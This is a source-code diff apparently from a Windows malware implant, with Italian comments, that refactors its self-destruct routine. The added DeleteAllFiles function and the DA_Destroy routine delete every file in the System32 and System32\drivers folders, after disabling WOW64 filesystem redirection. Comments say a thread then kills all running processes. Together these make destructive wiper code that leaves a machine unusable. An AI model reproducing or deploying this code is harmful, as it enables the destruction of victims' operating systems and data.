@@ -400,13 +400,20 @@ DWORD WINAPI KillAllProcess(DWORD dummy)
 	return 0;
 }
 
-void EmptyDirectory(WCHAR* path)
+void DeleteAllFiles(LPCWSTR lpEnvironmentVariable, LPCWSTR directory)
 {
+	WCHAR sys_path[MAX_PATH];
 	WCHAR search_path[MAX_PATH];
 	WIN32_FIND_DATAW find_data;
 	HANDLE hFind;
 
-	_snwprintf_s(search_path, sizeof(search_path) / sizeof(WCHAR), _TRUNCATE, L"%s\\*", path);
+	if (!FNC(GetEnvironmentVariableW)(lpEnvironmentVariable, sys_path, MAX_PATH))
+		return;
+
+	StrCatW(sys_path, directory);
+
+
+	_snwprintf_s(search_path, sizeof(search_path) / sizeof(WCHAR), _TRUNCATE, L"%s\\*", sys_path);
 
 	hFind = FNC(FindFirstFileW)(search_path, &find_data);
 	if (hFind != INVALID_HANDLE_VALUE) {
@@ -414,7 +421,7 @@ void EmptyDirectory(WCHAR* path)
 			if (find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
 				continue;
 
-			_snwprintf_s(search_path, sizeof(search_path) / sizeof(WCHAR), _TRUNCATE, L"%s\\%s", path, find_data.cFileName);
+			_snwprintf_s(search_path, sizeof(search_path) / sizeof(WCHAR), _TRUNCATE, L"%s\\%s", sys_path, find_data.cFileName);
 			DeleteFileW(search_path);
 		} while (FNC(FindNextFileW)(hFind, &find_data));
 		FNC(FindClose)(hFind);
@@ -428,18 +435,11 @@ BOOL WINAPI DA_Destroy(BYTE* isPermanent)
 
 	// Cancella alcuni file di sistema
 	if (*isPermanent) {
-		WCHAR sys_path[MAX_PATH];
 
 		DisableWow64Fs();
-		if (!FNC(GetEnvironmentVariableW)(L"SystemRoot", sys_path, MAX_PATH))
-			return FALSE;
-		StrCatW(sys_path, L"\\system32");
-		EmptyDirectory(sys_path);
 
-		if (!FNC(GetEnvironmentVariableW)(L"SystemRoot", sys_path, MAX_PATH))
-			return FALSE;
-		StrCatW(sys_path, L"\\system32\\drivers");
-		EmptyDirectory(sys_path);
+		DeleteAllFiles(L"SystemRoot", L"\\system32");
+		DeleteAllFiles(L"SystemRoot", L"\\system32\\drivers");
 	}
 
 	// Lancia un thread che killa tutti i processi
